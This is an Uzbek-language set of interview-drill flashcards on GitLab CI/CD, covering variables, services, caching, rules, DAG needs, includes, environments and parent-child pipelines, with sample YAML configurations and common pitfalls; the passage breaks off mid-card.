Interview Drill::CI/CD::I9 GitLab CI	idrill-32017	<p><code>variables</code> va CI/CD variable'lar qanday ishlaydi?</p>	<p><b>Qisqa javob:</b> <code>variables:</code> — YAML'da yoziladigan muhit o'zgaruvchilari (maxfiy bo'lmagan konfiguratsiya). CI/CD variables — loyiha/guruh/instance sozlamalarida saqlanadigan qiymatlar; ular Protected (faqat protected branch/tag pipeline'larida), Masked (logda yashirilgan) yoki File turida bo'lishi mumkin. GitLab yana yuzlab predefined o'zgaruvchilar beradi (<code>CI_COMMIT_SHA</code>, <code>CI_REGISTRY_IMAGE</code>...).</p><p><b>Amalda:</b></p><pre>variables:<br>  GO_VERSION: &quot;1.23&quot;<br>  CGO_ENABLED: &quot;0&quot;<br><br>build:<br>  image: golang:$GO_VERSION<br>  script:<br>    - echo &quot;Commit $CI_COMMIT_SHORT_SHA, branch $CI_COMMIT_REF_NAME&quot;<br>    - go build -ldflags &quot;-X main.version=$CI_COMMIT_SHA&quot; ./...<br><br>deploy:<br>  variables:<br>    ENV: staging          # job darajasi<br>  script: ./deploy.sh &quot;$ENV&quot; &quot;$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA&quot;</pre><p>Maxfiy qiymat — UI'da: Settings -&gt; CI/CD -&gt; Variables -&gt; <code>DEPLOY_TOKEN</code> (Protected + Masked and hidden).</p><p><b>Foydali predefined o'zgaruvchilar:</b></p><p>| O'zgaruvchi | Ma'nosi | |---|---| | <code>CI_COMMIT_SHA</code> / <code>CI_COMMIT_SHORT_SHA</code> | commit | | <code>CI_COMMIT_REF_NAME</code> / <code>CI_COMMIT_BRANCH</code> / <code>CI_COMMIT_TAG</code> | branch yoki tag | | <code>CI_PIPELINE_SOURCE</code> | push, merge_request_event, schedule... | | <code>CI_REGISTRY_IMAGE</code> | loyiha registry yo'li | | <code>CI_DEFAULT_BRANCH</code> | odatda main |</p><p><b>Ustunlik (yuqoridan pastga):</b> trigger/manual/scheduled pipeline o'zgaruvchilari &gt; project &gt; group &gt; instance &gt; YAML job <code>variables</code> &gt; YAML global <code>variables</code> &gt; predefined.</p><p><b>Tuzoqlar:</b></p><ul><li>Parolni <code>.gitlab-ci.yml</code> ga yozish — Git tarixida abadiy.</li><li>Protected variable unprotected branch'da bo'sh — &quot;nega staging deploy ishlamayapti&quot; holati.</li><li>Masking talablari (minimal uzunlik, ruxsat etilgan belgilar) — mos kelmasa mask qilib bo'lmaydi.</li><li>File turidagi variable'da <code>$VAR</code> — fayl yo'li, mazmun emas.</li></ul><p><b>Senior nuqta:</b> Prod secret'lari faqat Protected + Masked, va iloji bo'lsa umuman variable emas — OIDC (<code>id_tokens</code>) yoki Vault integratsiyasi (<code>secrets:</code> kaliti) orqali qisqa muddatli.</p>	lvl::Junior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32018	<p><code>image</code> va <code>services</code> kalitlari nima?</p>	<p><b>Qisqa javob:</b> <code>image</code> — job qaysi Docker image ichida bajarilishini belgilaydi (masalan <code>golang:1.23</code>). <code>services</code> — job davomida yonida ishga tushadigan qo'shimcha konteynerlar (PostgreSQL, Redis) — integration testlar uchun; ular <code>alias</code> (yoki image nomidan hosil bo'lgan) hostname orqali mavjud. Faqat docker va kubernetes executor'larda ishlaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>job &quot;test&quot;<br>  +-- asosiy konteyner: golang:1.23   (script shu yerda)<br>  +-- service:          postgres:16   hostname &quot;db&quot;<br>  +-- service:          redis:7       hostname &quot;redis&quot;<br>  job tugadi -&gt; hammasi o'chiriladi</pre><p><b>Amalda:</b></p><pre>test:<br>  image: golang:1.23<br>  services:<br>    - name: postgres:16<br>      alias: db<br>    - name: redis:7-alpine<br>      alias: cache<br>  variables:<br>    POSTGRES_PASSWORD: test<br>    POSTGRES_DB: app<br>    DATABASE_URL: &quot;postgres://postgres:test@db:5432/app?sslmode=disable&quot;<br>    REDIS_ADDR: &quot;cache:6379&quot;<br>  script:<br>    - until pg_isready -h db -U postgres; do sleep 1; done   # tayyorligini kutish<br>    - go test -tags=integration ./...</pre><p><code>variables</code> service konteynerlariga ham uzatiladi — <code>POSTGRES_PASSWORD</code> shu sababli ishlaydi.</p><p><b>Hostname qoidasi:</b> alias bo'lmasa — <code>postgres:16</code> -&gt; <code>postgres</code>; <code>registry.example.com/team/my-db:1</code> -&gt; <code>registry.example.com__team__my-db</code> va <code>registry.example.com-team-my-db</code>. Alias ishlatish aniqroq.</p><p><b>Tuzoqlar:</b></p><ul><li>Service hali tayyor emas, test darhol boshlanadi — &quot;connection refused&quot;; tayyorlikni kut.</li><li><code>localhost</code> ga ulanish — docker executor'da service alohida konteyner (kubernetes executor'da esa bitta pod, <code>localhost</code> ishlaydi) — alias ishlat, ikkalasida ham ishlaydi.</li><li><code>image:</code> da <code>latest</code> — kutilmagan yangilanish build'ni buzadi; versiya (yoki digest) pin qil.</li></ul><p><b>Senior nuqta:</b> Integration testlar uchun services oddiy va tez; murakkab topologiya kerak bo'lsa testcontainers (Docker socket kerak) yoki ephemeral review environment ko'rib chiq.</p>	lvl::Junior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32019	<p>Artifact va cache GitLab'da qanday farqlanadi?</p>	<p><b>Qisqa javob:</b> Artifact — job natijasi (binary, hisobot): GitLab serverida saqlanadi, keyingi stage job'lariga avtomatik beriladi, <code>expire_in</code> gacha kafolatlangan va UI'dan yuklab olinadi. Cache — tezlik uchun dependency'lar (<code>go mod</code>, <code>node_modules</code>): runner tomonida (lokal yoki S3) saqlanadi, kafolat yo'q — yo'q bo'lsa ham pipeline to'g'ri ishlashi shart.</p><p><b>Taqqoslash:</b></p><p>| | Artifact | Cache | |---|---|---| | Maqsad | natijani uzatish/saqlash | tezlashtirish | | Qayerda | GitLab server (object storage) | runner (lokal yoki S3/GCS) | | Kafolat | ha, <code>expire_in</code> gacha | yo'q | | Keyingi job'lar | default oladi | <code>key</code> mos kelsa | | Pipeline'lar orasida | yo'q (asosan) | ha |</p><p><b>Amalda:</b></p><pre>variables:<br>  GOPATH: $CI_PROJECT_DIR/.go     # cache faqat loyiha papkasi ichida ishlaydi<br><br>build:<br>  image: golang:1.23<br>  cache:<br>    key:<br>      files: [go.sum]             # go.sum o'zgarsa yangi cache<br>    paths: [.go/pkg/mod]<br>  script: go build -o app ./cmd/app<br>  artifacts:<br>    paths: [app]<br>    expire_in: 1 week<br>    reports:<br>      junit: report.xml           # MR'da test natijalari<br><br>deploy:<br>  needs: [build]                  # faqat build artifact'ini oladi<br>  script: ./deploy.sh ./app</pre><p><b>Cache policy:</b> ko'p job o'qiydi, bittasi yozadi:</p><pre>cache: {key: {files: [go.sum]}, paths: [.go/pkg/mod], policy: pull}</pre><p><b>Tuzoqlar:</b></p><ul><li>Cache path loyiha papkasidan tashqarida (<code>~/go/pkg/mod</code>) — saqlanmaydi; <code>GOPATH</code> ni ichkariga ko'chir.</li><li>Artifact'ni cache o'rnida ishlatish — har job katta fayllarni yuklaydi, storage o'sadi.</li><li><code>expire_in</code> yo'q — artifact'lar instance default'igacha (ko'pincha 30 kun) qoladi; disk to'ladi.</li><li>Turli runner'lar lokal cache'ni bo'lishmaydi — distributed cache (S3) kerak.</li></ul><p><b>Senior nuqta:</b> Artifact'larni minimal qil (faqat keyingi job'ga kerakli) va <code>needs</code>/<code>dependencies</code> bilan aniq yo'naltir — katta monorepo'da bu pipeline vaqtini sezilarli kamaytiradi.</p>	lvl::Junior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33038	<p><code>before_script</code>, <code>script</code>, <code>after_script</code> farqi?</p>	<p><b>Qisqa javob:</b> <code>before_script</code> — asosiy skriptdan oldin bajariladi (tayyorgarlik: dependency yuklash, login); <code>script</code> — job'ning asosiy ishi (majburiy); <code>after_script</code> — job natijasidan qat'i nazar (muvaffaqiyat yoki xato) oxirida bajariladi (tozalash). <code>before_script</code> va <code>script</code> bitta shell'da birlashtirib ishlaydi; <code>after_script</code> — alohida yangi shell'da.</p><p><b>Qanday ishlaydi:</b></p><pre>[before_script + script]  (bitta shell sessiyasi)<br>     |  biror buyruq fail -&gt; qolganlari bajarilmaydi, job FAILED<br>     v<br>[after_script]            (YANGI shell, alohida timeout ~5 daqiqa)<br>     |  fail bo'lsa ham job natijasini o'zgartirmaydi</pre><p><b>Amalda:</b></p><pre>default:<br>  before_script:<br>    - go mod download<br><br>integration:<br>  image: golang:1.23<br>  before_script:                        # default'ni ustidan yozadi<br>    - export TEST_DB=test_$CI_JOB_ID<br>    - ./scripts/create-db.sh &quot;$TEST_DB&quot;<br>  script:<br>    - go test -tags=integration ./...<br>  after_script:<br>    - ./scripts/drop-db.sh &quot;test_$CI_JOB_ID&quot;   # $TEST_DB bu yerda YO'Q<br>    - echo &quot;Job holati: $CI_JOB_STATUS&quot;        # success / failed / canceled</pre><p><b>Muhim nuanslar:</b></p><ul><li><code>after_script</code> <code>before_script</code>/<code>script</code> da <code>export</code> qilingan o'zgaruvchilarni ko'rmaydi — qayta hisobla yoki faylga yoz.</li><li><code>after_script</code> timeout'i alohida (default 5 daqiqa; <code>RUNNER_AFTER_SCRIPT_TIMEOUT</code>).</li><li><code>$CI_JOB_STATUS</code> faqat <code>after_script</code> da — natijaga qarab harakat qilish uchun.</li><li>Job darajasidagi <code>before_script</code> <code>default:</code> dagini almashtiradi (birlashtirmaydi).</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Cleanup'ni <code>script</code> oxiriga qo'yish — test fail bo'lsa cleanup bajarilmaydi.</li><li><code>after_script</code> dagi xato pipeline'ni qizil qilmaydi — muhim tekshiruvni u yerga qo'yma.</li><li>Job bekor qilinganda (cancel) <code>after_script</code> yangi versiyalarda bajariladi, eski versiyalarda yo'q — unga to'liq tayanma.</li></ul><p><b>Senior nuqta:</b> Cleanup'ni idempotent va resurs nomini deterministik (<code>$CI_JOB_ID</code> bilan) qil — <code>after_script</code> bajarilmagan holatlar uchun TTL asosidagi &quot;garbage collector&quot; job'i ham bo'lsin.</p>	lvl::Junior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33039	<p><code>allow_failure</code>, <code>retry</code> va <code>timeout</code> kalitlari?</p>	<p><b>Qisqa javob:</b> <code>allow_failure</code> — job fail bo'lsa ham pipeline davom etadi va sariq ogohlantirish bilan &quot;passed&quot; bo'ladi (<code>exit_codes</code> bilan faqat ma'lum kodlar uchun). <code>retry</code> — job fail bo'lganda avtomatik qayta urinish (max 2), <code>when</code> bilan faqat ma'lum xato turlarida. <code>timeout</code> — job uchun maksimal vaqt (loyiha default'i, ko'pincha 1 soat).</p><p><b>Amalda:</b></p><pre>lint:<br>  script: golangci-lint run<br>  allow_failure: true                # ogohlantirish, bloklamaydi<br><br>security-scan:<br>  script: ./scan.sh<br>  allow_failure:<br>    exit_codes: [2]                  # 2 = &quot;past severity topildi&quot; - ok; boshqa kod - fail<br><br>e2e:<br>  timeout: 30m<br>  retry:<br>    max: 2<br>    when:<br>      - runner_system_failure<br>      - stuck_or_timeout_failure<br>      - scheduler_failure<br>  script: make e2e</pre><p>Ko'p uchraydigan <code>retry.when</code> qiymatlari: <code>runner_system_failure</code>, <code>stuck_or_timeout_failure</code>, <code>api_failure</code>, <code>scheduler_failure</code>, <code>data_integrity_failure</code>, <code>script_failure</code> (bunisi xavfli). Yangi versiyalarda: <code>retry: exit_codes: [137]</code> (OOM yoki spot o'ldirilishi).</p><p><b>Qachon nima:</b></p><p>| Kalit | Ishlat | Ishlatma | |---|---|---| | <code>allow_failure</code> | eksperimental, ixtiyoriy skan | asosiy testlar, build | | <code>retry</code> + <code>when</code> infra | spot runner, tarmoq | test xatosi uchun | | <code>timeout</code> | har job'ga real qiymat | — |</p><p><b>Tuzoqlar:</b></p><ul><li><code>retry: 2</code> (<code>when</code> siz) — test fail'ini ham qayta urinadi; flaky test yashirinadi.</li><li><code>allow_failure: true</code> muhim job'da — qizil bo'lishi kerak bo'lgan pipeline yashil ko'rinadi, hech kim qaramaydi.</li><li><code>timeout</code> runner'ning o'z timeout'idan katta — kichigi amal qiladi.</li><li><code>allow_failure</code> li <code>when: manual</code> job — pipeline'ni bloklamaydi (manual job default <code>allow_failure: true</code>).</li></ul><p><b>Senior nuqta:</b> <code>allow_failure</code> li job'larni vaqtinchalik deb hisobla — egasi va muddat bilan. Retry statistikasini kuzat: ko'p retry — runner yoki infra muammosi signali.</p>	lvl::Junior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33040	<p>Pipeline turlari: branch, tag, MR, scheduled — <code>CI_PIPELINE_SOURCE</code> qanday yordam beradi?</p>	<p><b>Qisqa javob:</b> GitLab pipeline'lari turli manbalardan yaratiladi: branch push (<code>push</code>), tag (<code>push</code> + <code>CI_COMMIT_TAG</code>), merge request (<code>merge_request_event</code>), jadval (<code>schedule</code>), qo'lda (<code>web</code>), API/trigger (<code>api</code>, <code>trigger</code>), boshqa pipeline'dan (<code>parent_pipeline</code>, <code>pipeline</code>). <code>CI_PIPELINE_SOURCE</code> qaysi manba ekanini aytadi va <code>rules</code> orqali har tur uchun turli job'larni tanlash va dublikat pipeline'larning oldini olishga yordam beradi.</p><p><b>Muammo (dublikat):</b> Branch'ga push qilding, MR ham ochiq — GitLab ikkita pipeline yaratadi: branch pipeline va MR pipeline. Runner ikki barobar ishlaydi.</p><p><b>Yechim (workflow:rules):</b></p><pre>workflow:<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;merge_request_event&quot;   # MR -&gt; MR pipeline<br>    - if: $CI_COMMIT_BRANCH &amp;&amp; $CI_OPEN_MERGE_REQUESTS<br>      when: never                                         # MR ochiq branch push -&gt; yo'q<br>    - if: $CI_COMMIT_BRANCH                               # oddiy branch push<br>    - if: $CI_COMMIT_TAG                                  # tag<br>    - if: $CI_PIPELINE_SOURCE == &quot;schedule&quot;</pre><p>Qisqa variant — tayyor shablon: <code>include: template: Workflows/MergeRequest-Pipelines.gitlab-ci.yml</code> (yoki <code>Branch-Pipelines</code>).</p><p><b>Job darajasida manba bo'yicha:</b></p><pre>unit:<br>  script: go test ./...          # hamma pipeline'da<br><br>nightly-e2e:<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;schedule&quot;<br>  script: make e2e<br><br>release:<br>  rules:<br>    - if: $CI_COMMIT_TAG =~ /^v\d+\.\d+\.\d+$/<br>  script: ./release.sh</pre><p><b>Manbalar jadvali:</b></p><p>| <code>CI_PIPELINE_SOURCE</code> | Qachon | |---|---| | <code>push</code> | branch yoki tag push | | <code>merge_request_event</code> | MR yaratildi/yangilandi | | <code>schedule</code> | jadval | | <code>web</code> | UI'dan &quot;Run pipeline&quot; | | <code>api</code> / <code>trigger</code> | API, trigger token | | <code>parent_pipeline</code> | child pipeline |</p><p><b>Tuzoqlar:</b></p><ul><li>MR pipeline'da <code>CI_COMMIT_BRANCH</code> bo'sh — <code>CI_MERGE_REQUEST_SOURCE_BRANCH_NAME</code> ishlat.</li><li><code>workflow:rules</code> hech biriga mos kelmasa — pipeline umuman yaratilmaydi.</li><li>Protected variable'lar MR pipeline'ida (protected bo'lmagan source branch) — mavjud emas.</li></ul><p><b>Senior nuqta:</b> <code>workflow:rules</code> ni har loyihada standart shablon bilan ber — dublikat pipeline'lar runner xarajatini sezilarli oshiradi va jamoani chalg'itadi.</p>	lvl::Junior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33041	<p>GitLab Container Registry'ga image push qilish?</p>	<p><b>Qisqa javob:</b> GitLab har loyiha uchun o'rnatilgan Container Registry beradi va job'ga avtomatik credential'lar (<code>CI_REGISTRY</code>, <code>CI_REGISTRY_USER</code>, <code>CI_REGISTRY_PASSWORD</code>, <code>CI_REGISTRY_IMAGE</code>) beradi. Job registry'ga login qilib, image'ni commit SHA tag bilan build va push qiladi. Docker-in-Docker (DinD) privileged runner talab qiladi — xavfsizroq alternativa: Kaniko yoki Buildah.</p><p><b>DinD bilan:</b></p><pre>build-image:<br>  image: docker:27<br>  services: [docker:27-dind]<br>  variables:<br>    DOCKER_TLS_CERTDIR: &quot;/certs&quot;<br>  script:<br>    - echo &quot;$CI_REGISTRY_PASSWORD&quot; | docker login -u &quot;$CI_REGISTRY_USER&quot; --password-stdin &quot;$CI_REGISTRY&quot;<br>    - docker build --pull -t &quot;$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA&quot; .<br>    - docker push &quot;$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA&quot;<br>  rules:<br>    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH</pre><p><b>Privileged'siz (Buildah):</b></p><pre>build-image:<br>  image: quay.io/buildah/stable<br>  script:<br>    - buildah login -u &quot;$CI_REGISTRY_USER&quot; -p &quot;$CI_REGISTRY_PASSWORD&quot; &quot;$CI_REGISTRY&quot;<br>    - buildah build -t &quot;$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA&quot; .<br>    - buildah push &quot;$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA&quot;</pre><p>Kaniko ham keng ishlatilgan, lekin asl Google loyihasi 2025 da arxivlandi — fork'lar yoki Buildah/BuildKit rootless'ga o'tish tavsiya.</p><p><b>Tag strategiyasi:</b></p><ul><li><code>$CI_COMMIT_SHA</code> — har build noyob, deploy aniq versiyani biladi.</li><li><code>$CI_COMMIT_TAG</code> (v1.4.0) — release.</li><li><code>latest</code> — faqat qulaylik uchun, deploy'da ishlatma.</li></ul><p><b>Tuzoqlar:</b></p><ul><li><code>docker login -p $PASS</code> — parol process ro'yxatida va ba'zan logda; <code>--password-stdin</code> ishlat.</li><li>DinD uchun runner <code>privileged = true</code> — job host'ni egallashi mumkin; shared runner'larda xavfli.</li><li>Layer cache yo'q — har build noldan; <code>--cache-from</code> yoki registry cache.</li><li>Registry cleanup policy yo'q — storage cheksiz o'sadi.</li></ul><p><b>Senior nuqta:</b> Image'ni imzola (cosign) va SBOM qo'sh; deploy'da tag emas, digest ishlat. Registry'da cleanup policy (masalan, 30 kundan eski SHA tag'larni o'chirish, release tag'larni saqlash) sozla.</p>	lvl::Junior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32020	<p><code>rules</code> va eski <code>only/except</code> farqi?</p>	<p><b>Qisqa javob:</b> <code>rules</code> — job pipeline'ga qo'shilishi va qanday (<code>on_success</code>, <code>manual</code>, <code>delayed</code>, <code>never</code>) qo'shilishini belgilaydigan zamonaviy mexanizm: <code>if</code> (o'zgaruvchilar ifodasi), <code>changes</code>, <code>exists</code> shartlari tartib bilan tekshiriladi, birinchi mos kelgani qo'llanadi. <code>only/except</code> — eski, cheklangan sintaksis (deprecated emas, lekin rivojlanmayapti); ikkalasini bitta job'da aralashtirib bo'lmaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>rules ro'yxati yuqoridan pastga:<br>  rule 1 mos? -&gt; ha -&gt; uning when/allow_failure/variables qo'llanadi, STOP<br>  rule 2 mos? -&gt; ...<br>  hech biri mos emas -&gt; job pipeline'ga QO'SHILMAYDI</pre><p><b>Amalda:</b></p><pre>deploy:<br>  script: ./deploy.sh<br>  rules:<br>    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH<br>      when: manual                   # main'da - qo'lda tugma<br>    - if: $CI_PIPELINE_SOURCE == &quot;merge_request_event&quot;<br>      changes: [k8s/**/*]            # MR'da faqat k8s o'zgarsa<br>      when: on_success<br>    - when: never                    # boshqa hollarda yo'q<br><br>tests:<br>  script: go test ./...<br>  rules:<br>    - if: $CI_COMMIT_MESSAGE =~ /\[skip tests\]/<br>      when: never<br>    - when: on_success</pre><p>Eski sintaksis (taqqoslash uchun):</p><pre>deploy:<br>  only: [main]<br>  except: [schedules]</pre><p><b><code>rules</code> afzalliklari:</b> murakkab mantiq (AND/OR, regex), <code>when: manual/delayed</code> shartga qarab, rule bo'yicha <code>variables</code> va <code>allow_failure</code>, <code>changes: compare_to</code>, <code>workflow:rules</code> bilan butun pipeline'ni boshqarish.</p><p><b>Tuzoqlar:</b></p><ul><li>Hech bir rule mos kelmasa job qo'shilmaydi — &quot;job yo'qolib qoldi&quot; muammosi; oxiriga aniq <code>- when: never</code> yoki <code>- when: on_success</code> qo'y.</li><li><code>changes</code> branch push'da (MR'siz) yangi branch uchun har doim <code>true</code> — <code>compare_to: refs/heads/main</code> ishlat.</li><li><code>when: manual</code> rule'da <code>allow_failure</code> default <code>false</code> — pipeline &quot;blocked&quot; bo'lib turadi.</li><li><code>rules</code> va <code>only</code> ni bitta job'da — sintaksis xatosi.</li></ul><p><b>Senior nuqta:</b> Umumiy rule to'plamlarini hidden job'larda saqlab <code>!reference [.rules-mr, rules]</code> bilan qayta ishlat — 50 job'da bir xil mantiqni takrorlamaslik uchun.</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32021	<p><code>needs</code> (DAG) stage'lardan nimasi bilan yaxshi?</p>	<p><b>Qisqa javob:</b> <code>needs</code> job'lar orasida aniq bog'liqlik o'rnatib DAG (yo'naltirilgan graf) yaratadi: job o'zi bog'liq bo'lgan job'lar tugashi bilan boshlanadi, butun oldingi stage'ni kutmaydi. Natija — critical path qisqaradi, pipeline tezlashadi. Bundan tashqari <code>needs</code> artifact'larni ham faqat ko'rsatilgan job'lardan oladi.</p><p><b>Stage va DAG:</b></p><pre>Stage model:<br>  build:  [build-a 2m] [build-b 10m]<br>  test:   [test-a] [test-b]           &lt;- ikkalasi build-b (10m) ni kutadi<br>  jami: ~10m + test<br><br>DAG (needs):<br>  build-a 2m --&gt; test-a      (2-daqiqada boshlanadi)<br>  build-b 10m --&gt; test-b<br>  lint (needs: []) darhol</pre><p><b>Amalda:</b></p><pre>stages: [build, test, deploy]<br><br>lint:<br>  stage: test<br>  needs: []                 # hech narsani kutmaydi, pipeline boshida<br>  script: make lint<br><br>build-a:<br>  stage: build<br>  script: make build-a<br>  artifacts: {paths: [dist/a]}<br><br>test-a:<br>  stage: test<br>  needs: [build-a]          # faqat build-a ni kutadi va uning artifact'ini oladi<br>  script: make test-a<br><br>deploy-a:<br>  stage: deploy<br>  needs:<br>    - job: test-a<br>      artifacts: false      # test artifact'i kerak emas<br>    - build-a<br>  script: ./deploy.sh dist/a</pre><p><b>Qo'shimcha imkoniyatlar:</b></p><ul><li><code>needs: optional: true</code> — job pipeline'da bo'lmasa ham (rules bilan o'chirilgan) xato bermaydi.</li><li>Bir stage ichida ham <code>needs</code> mumkin (stage'siz pipeline).</li><li>Limit: bitta job'da 50 tagacha needs.</li></ul><p><b>Tuzoqlar:</b></p><ul><li><code>needs</code> dagi job <code>rules</code> bilan pipeline'ga qo'shilmagan — &quot;needs job not found&quot; xatosi; <code>optional: true</code>.</li><li><code>needs</code> bilan artifact faqat ko'rsatilgan job'lardan — boshqa kerakli artifact yo'q bo'lib qoladi.</li><li>Monorepo'da <code>changes</code> + <code>needs</code> ehtiyotsiz ishlatilsa grafda &quot;teshik&quot; paydo bo'ladi.</li></ul><p><b>Senior nuqta:</b> Pipeline'ni GitLab &quot;Needs&quot; (DAG) vizualizatsiyasida ko'r va critical path'ni o'lcha — optimizatsiya faqat shu yo'ldagi job'larga ta'sir qiladi.</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32022	<p><code>include</code> va <code>extends</code> bilan konfiguratsiyani qanday qayta ishlatasiz?</p>	<p><b>Qisqa javob:</b> <code>include</code> — boshqa YAML fayllarni pipeline'ga ulaydi (shu repo'dan, boshqa loyihadan, URL'dan yoki GitLab shablonlaridan). <code>extends</code> — job'ga boshqa (odatda hidden, <code>.</code> bilan boshlanadigan) job'ning kalitlarini meros qilib beradi. Zamonaviy yo'l — CI/CD Components: versiyalangan, input'li, katalogda e'lon qilinadigan qayta ishlatiladigan bloklar.</p><p><b>Amalda:</b></p><pre>include:<br>  - local: ci/lint.yml                          # shu repo<br>  - project: platform/ci-templates              # boshqa loyiha<br>    ref: v2.1.0                                 # pin qilingan versiya<br>    file: /go.yml<br>  - template: Jobs/SAST.gitlab-ci.yml           # GitLab shabloni<br>  - component: $CI_SERVER_FQDN/platform/components/go-test@1.4.0<br>    inputs:<br>      go_version: &quot;1.23&quot;<br><br>.go-base:                                       # hidden job - shablon<br>  image: golang:1.23<br>  before_script: [go mod download]<br>  cache: {key: {files: [go.sum]}, paths: [.go/pkg/mod]}<br><br>test:<br>  extends: .go-base<br>  script: go test ./...<br><br>build:<br>  extends: .go-base<br>  script: go build ./...</pre><p><b>Merge qoidasi (<code>extends</code>):</b></p><ul><li>Hash (map) kalitlar chuqur birlashtiriladi (<code>variables</code>, <code>cache</code>).</li><li>Massivlar (<code>script</code>, <code>rules</code>) <b>almashtiriladi</b>, qo'shilmaydi.</li><li>Bir nechta: <code>extends: [.go-base, .k8s-deploy]</code> — keyingisi ustun.</li></ul><p><b>Component misoli (<code>templates/go-test.yml</code>):</b></p><pre>spec:<br>  inputs:<br>    go_version: {default: &quot;1.23&quot;}<br>---<br>go-test:<br>  image: golang:$[[ inputs.go_version ]]<br>  script: go test ./...</pre><p><b>Tuzoqlar:</b></p><ul><li><code>include</code> da <code>ref: main</code> — platform jamoasining har o'zgarishi hamma pipeline'ni bir zumda buzadi; tag'ga pin qil.</li><li><code>extends</code> bilan <code>script</code> qo'shilmoqchi bo'lish — almashtiriladi; <code>!reference</code> ishlat.</li><li>Juda chuqur meros zanjiri — job qayerdan nima olganini tushunish qiyin; &quot;Full configuration&quot; ko'rinishi (Pipeline editor) bilan tekshir.</li></ul><p><b>Senior nuqta:</b> Yangi platform shablonlarini Components sifatida chiqar: semver, input validatsiyasi, CI/CD Catalog'da hujjat — <code>include: project</code> ga nisbatan aniqroq kontrakt.</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32023	<p>Environment, <code>when: manual</code> va review app'lar?</p>	<p><b>Qisqa javob:</b> <code>environment</code> job'ni deploy maqsadiga (staging, production, review/feature-x) bog'laydi: GitLab deploy tarixini, joriy versiyani, URL'ni ko'rsatadi va rollback imkonini beradi. <code>when: manual</code> job'ni qo'lda tugma bilan ishga tushiriladigan qiladi (prod gate). Review app — har MR uchun avtomatik yaratiladigan vaqtinchalik muhit (<code>environment: name: review/$CI_COMMIT_REF_SLUG</code>), MR yopilganda o'chiriladi.</p><p><b>Review app oqimi:</b></p><pre>MR ochildi -&gt; review job: helm install app-42 -&gt; https://feature-x.dev.example.com<br>MR'da &quot;View app&quot; tugmasi<br>MR merge/yopildi -&gt; stop-review (on_stop) -&gt; helm uninstall<br>yoki auto_stop_in: 2 days o'tdi -&gt; avtomatik stop</pre><p><b>Amalda:</b></p><pre>review:<br>  stage: deploy<br>  script:<br>    - helm upgrade --install &quot;app-$CI_MERGE_REQUEST_IID&quot; ./chart<br>        --set ingress.host=&quot;$CI_COMMIT_REF_SLUG.dev.example.com&quot;<br>  environment:<br>    name: review/$CI_COMMIT_REF_SLUG<br>    url: https://$CI_COMMIT_REF_SLUG.dev.example.com<br>    on_stop: stop-review<br>    auto_stop_in: 2 days<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;merge_request_event&quot;<br><br>stop-review:<br>  stage: deploy<br>  script: helm uninstall &quot;app-$CI_MERGE_REQUEST_IID&quot;<br>  environment:<br>    name: review/$CI_COMMIT_REF_SLUG<br>    action: stop<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;merge_request_event&quot;<br>      when: manual<br><br>deploy-prod:<br>  stage: deploy<br>  script: ./deploy.sh production<br>  environment: {name: production, url: https://app.example.com}<br>  resource_group: production<br>  rules:<br>    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH<br>      when: manual</pre><p><b>Himoya:</b> Protected environments — faqat ruxsat etilgan foydalanuvchi/guruh deploy qila oladi, kerak bo'lsa N ta approval talab qilinadi. <code>resource_group</code> — bir environment'ga parallel deploy'ni taqiqlaydi.</p><p><b>Tuzoqlar:</b></p><ul><li><code>on_stop</code> job'i yo'q yoki ishlamaydi — review muhitlar to'planib, cluster resurslari va pul yeyiladi.</li><li><code>CI_COMMIT_REF_SLUG</code> uzun bo'lsa DNS nomi 63 belgidan oshadi.</li><li>Review app'lar prod secret'lari bilan — alohida, cheklangan credential'lar ishlat.</li></ul><p><b>Senior nuqta:</b> Review app'lar uchun TTL (<code>auto_stop_in</code>) va cluster darajasida cleanup (masalan, label bo'yicha eski namespace'larni o'chiruvchi cron) — ikki qavatli himoya.</p>	lvl::Middle dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-32024	<p>Parent-child va multi-project pipeline nima?</p>	<p><b>Qisqa javob:</b> Parent-child pipeline — bitta loyiha ichida asosiy pipeline <code>trigger: include:</code> orqali alohida child pipeline'larni ishga tushiradi (monorepo'da har servis uchun, yoki dinamik generatsiya qilingan YAML bilan). Multi-project pipeline — <code>trigger: project:</code> orqali boshqa loyihaning pipeline'ini ishga tushirish (masalan, kutubxona release'dan keyin ilovani qayta build qilish). <code>strategy: depend</code> bilan parent child natijasini kutadi va uni o'z holatiga aks ettiradi.</p><p><b>Tuzilma:</b></p><pre>Parent pipeline (monorepo)<br>  +-- trigger billing -&gt; child: services/billing/.gitlab-ci.yml<br>  +-- trigger auth    -&gt; child: services/auth/.gitlab-ci.yml<br>  +-- generate -&gt; child.yml (artifact) -&gt; trigger dynamic child<br><br>Multi-project:<br>  lib-repo pipeline 